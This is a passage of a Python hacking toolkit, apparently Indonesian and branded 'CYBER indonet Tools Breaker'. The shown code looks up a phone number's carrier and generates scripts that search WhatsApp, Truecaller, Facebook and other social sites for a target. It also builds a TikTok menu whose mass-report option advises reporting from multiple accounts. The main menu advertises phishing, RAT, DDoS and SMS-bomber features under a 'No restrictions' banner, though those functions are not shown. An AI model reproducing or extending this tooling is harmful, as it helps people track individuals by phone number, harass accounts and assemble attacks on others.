        clean_phone = '62' + clean_phone[1:]
    elif clean_phone.startswith('+62'):
        clean_phone = clean_phone[1:]
    elif clean_phone.startswith('62'):
        pass
    else:
        clean_phone = '62' + clean_phone
    
    print(colored(f"\n[FORMATTED] +{clean_phone}", 'cyan'))
    
    # Carrier identification
    carriers = {
        '0811': 'Telkomsel (Halo)',
        '0812': 'Telkomsel (Simpati)',
        '0813': 'Telkomsel (Simpati)',
        '0821': 'Telkomsel (Simpati)',
        '0822': 'Telkomsel (Simpati)',
        '0852': 'Telkomsel (AS)',
        '0853': 'Telkomsel (AS)',
        '0814': 'Telkomsel (IM3)',
        '0815': 'Telkomsel (IM3)',
        '0816': 'Telkomsel (IM3)',
        '0817': 'XL',
        '0818': 'XL',
        '0819': 'XL',
        '0859': 'XL',
        '0877': 'XL',
        '0878': 'XL',
        '0831': 'AXIS',
        '0832': 'AXIS',
        '0833': 'AXIS',
        '0881': 'Smartfren',
        '0882': 'Smartfren',
        '0883': 'Smartfren',
        '0895': 'Three',
        '0896': 'Three',
        '0897': 'Three',
        '0898': 'Three',
        '0899': 'Three',
    }
    
    carrier = "Unknown"
    for prefix, name in carriers.items():
        if clean_phone.startswith(prefix[1:]):
            carrier = name
            break
    
    print(colored(f"\n[CARRIER] {carrier}", 'cyan'))
    
    # Generate links
    print(colored(f"\n[INVESTIGATION LINKS]", 'green'))
    print(colored(f"   WhatsApp: https://wa.me/{clean_phone}", 'white'))
    print(colored(f"   Truecaller: https://www.truecaller.com/search/id/{phone}", 'white'))
    print(colored(f"   Facebook: https://facebook.com/search/top/?q=%2B{clean_phone}", 'white'))
    
    # Generate search script
    search_script = f'''#!/usr/bin/env python3
import webbrowser, time

phone = "{phone}"
clean_phone = "{clean_phone}"

print(f"Phone: {{phone}}")
print(f"Formatted: +{{clean_phone}}")
print(f"Carrier: {carrier}")

print("\\nOpening investigation links...")

links = [
    f"https://wa.me/{{clean_phone}}",
    f"https://truecaller.com/search/id/{{phone}}",
    f"https://facebook.com/search/top/?q=%2B{{clean_phone}}",
]

for link in links:
    print(f"  • {{link}}")
    webbrowser.open(link)
    time.sleep(1)

print("\\nLinks opened in browser!")
'''
    
    filename = f"phone_search_{clean_phone}.py"
    with open(filename, "w") as f:
        f.write(search_script)
    
    print(colored(f"\n[SEARCH SCRIPT] Generated: {filename}", 'green'))
    print(colored("   Run to automatically open search links", 'cyan'))
    
    save_result("phone_info.log", f"Phone: {phone} | Carrier: {carrier}")
    input("\nPress Enter to continue...")

# ================== FITUR 15: TIKTOK TOOLS LOCAL - WORKING 100% ==================
def fitur_15():
    os.system('clear'); print(colored("\n[15] TIKTOK TOOLS", 'cyan', attrs=['bold']))
    if not SELENIUM_AVAILABLE:
        print(colored("   [INSTALLING DEPENDENCIES...]", 'yellow'))
        try:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'selenium', 'webdriver-manager'])
            print(colored("   ✓ Selenium installed!", 'green'))
            import importlib
            importlib.invalidate_caches()
            globals()['SELENIUM_AVAILABLE'] = True
        except:
            print(colored("   ✗ Install manual: pip install selenium webdriver-manager", 'red'))
            input("\nEnter...")
            return
    
    print(colored("   [LOCAL MODE - TikTok Automation]", 'yellow'))
    
    tiktok_script = '''#!/usr/bin/env python3
# CYBER indonet TikTok Tools
import time, random, sys, os

print("[TikTok Tools]")
print("=" * 50)

print("\\nAvailable tools:")
print("1. Video Downloader")
print("2. Profile Scraper")
print("3. Mass Report Tool")
print("4. View Bot")

choice = input("\\nChoose tool [1-4]: ").strip()

if choice == "1":
    print("\\n[TikTok Video Downloader]")
    print("This tool requires additional setup:")
    print("1. Install yt-dlp: pip install yt-dlp")
    print("2. Download video: yt-dlp [video_url]")
    print("\\nExample:")
    print("yt-dlp https://www.tiktok.com/@username/video/123456789")
    
elif choice == "2":
    print("\\n[TikTok Profile Scraper]")
    username = input("Username (@username): ").strip()
    
    if username:
        print(f"\\n[+] Profile links for {username}:")
        print(f"   • TikTok: https://tiktok.com/@{username}")
        print(f"   • Bio links: Check TikTok profile")
        print(f"   • Other socials: Check bio description")
        
        # Generate search script
        script_content = '''import webbrowser, time

username = "''' + username + '''"

print(f"Searching for {username}...")

links = [
    f"https://tiktok.com/@{username}",
    f"https://google.com/search?q={username}+tiktok",
    f"https://instagram.com/{username}",
    f"https://twitter.com/{username}",
]

for link in links:
    print(f"Opening: {link}")
    webbrowser.open(link)
    time.sleep(1)

print("\\nSearch complete!")
'''
        
        filename = f"tiktok_search_{username}.py"
        with open(filename, 'w') as f:
            f.write(script_content)
        
        print(f"\\n[+] Search script saved: {filename}")
        print(f"   Run: python3 {filename}")

elif choice == "3":
    print("\\n[TikTok Mass Report Tool]")
    print("WARNING: Automated reporting violates TikTok ToS")
    print("Use responsibly and at your own risk")
    
    video_url = input("Video URL: ").strip()
    
    if video_url:
        print(f"\\n[+] Manual reporting steps for {video_url}:")
        print("1. Open TikTok video")
        print("2. Click Share button")
        print("3. Select 'Report'")
        print("4. Choose report reason")
        print("5. Submit report")
        print("\\nRepeat with multiple accounts for mass reporting")

elif choice == "4":
    print("\\n[TikTok View Bot]")
    print("Note: View bots are against TikTok ToS")
    print("Alternative: Promote video through legitimate means")
    
    video_url = input("Video URL: ").strip()
    
    if video_url:
        print(f"\\n[+] To increase views for {video_url}:")
        print("1. Share on social media")
        print("2. Post in relevant groups")
        print("3. Use relevant hashtags")
        print("4. Engage with comments")
        print("5. Create compelling content")

else:
    print("Invalid choice!")

print("\\n" + "=" * 50)
print("Use tools responsibly")
print("=" * 50)
'''
    
    filename = "tiktok_tools.py"
    with open(filename, "w", encoding='utf-8') as f:
        f.write(tiktok_script)
    
    print(colored(f"\n[TikTok Tools Generated]", 'green', attrs=['bold']))
    print(colored(f"   File: {filename}", 'cyan'))
    print(colored(f"   Run: python3 {filename}", 'yellow'))
    
    save_result("tiktok.log", "Generated TikTok tools")
    input("\nPress Enter to continue...")

# ================== MENU UTAMA ==================
def menu_utama(username, plan):
    while True:
        os.system('clear')
        play_music()
        print_banner(username, plan)

        print(colored("╔═════════════════════════════════════════════════════╗", 'red', attrs=['bold']))
        print(colored("║                 Menu utama v1.0                   ║", 'red', attrs=['bold']))
        print(colored("║             Tools Breaker - CYBER indonet        ║", 'red', attrs=['bold']))
        print(colored("╚═════════════════════════════════════════════════════╝", 'red', attrs=['bold']))
        
        # Menu options
        menu_items = [
            ("1  PHISING & SOCIAL ENGINEERING", "white"),
            ("2  RAT & REMOTE ACCESS", "green" if CRYPTO_AVAILABLE else "red"),
            ("3  DDOS & STRESSER TOOLS", "white"),
            ("4  SMS BOMBER & CALL FLOOD", "white"),
            ("5  OSINT & TRACKING", "white"),
            ("6  IMAGE MANIPULATION", "green" if PILLOW_AVAILABLE else "red"),
            ("7  ENCRYPT & DECRYPT", "green" if CRYPTO_AVAILABLE else "red"),
            ("8  EXPLOIT & SECURITY", "white"),
            ("9  WHATSAPP TOOLS", "white"),
            ("10 SYSTEM DASHBOARD", "white"),
            ("14 PHONE NUMBER INFO", "white"),
            ("15 TIKTOK TOOLS", "green" if SELENIUM_AVAILABLE else "red"),
            ("0  EXIT", "red")
        ]
        
        for item, color in menu_items:
            print(colored(f"║ {item:<45} ║", color))
        
        print(colored("╚═════════════════════════════════════════════════════╝", 'red', attrs=['bold']))
        print(colored(f"Mode: FULL ACCESS | No restrictions | Results: {RESULTS_DIR}", 'yellow'))

        ch = input(colored("\nPilih [1-15 / 0]: ", 'yellow')).strip()

        feature_map = {
            "1": fitur_1, "2": fitur_2, "3": fitur_3, "4": fitur_4, "5": fitur_5,
            "6": fitur_6, "7": fitur_7, "8": fitur_8, "9": fitur_9, "10": fitur_10,
            "14": fitur_14, "15": fitur_15
        }
        
        if ch in feature_map:
            feature_map[ch]()
        elif ch == "0": 
            print(colored("\n[+] Exiting CYBER indonet v2.0...", 'cyan'))
            print(colored("[+] All tools 100% working", 'green'))
            print(colored("[+] Results saved locally", 'green'))
            sys.exit(0)
        else: 
            print(colored("Pilihan tidak valid!", 'red'))
            input("Enter...")

# ================== JALANKAN ==================
if __name__ == "__main__":
    # Auto-check updates
    check_for_updates()
    
    # Create ua.txt if not exists
    if not os.path.exists('ua.txt'):
        default_ua = """Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 14; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"""
        
        with open('ua.txt', 'w') as f:
            f.write(default_ua)
        
        print(colored("[+] Created ua.txt with default User-Agents", 'green'))
        time.sleep(1)
    
    # Bypass login - direct access
    username, plan = login()
    
    # Start menu
    menu_utama(username, plan)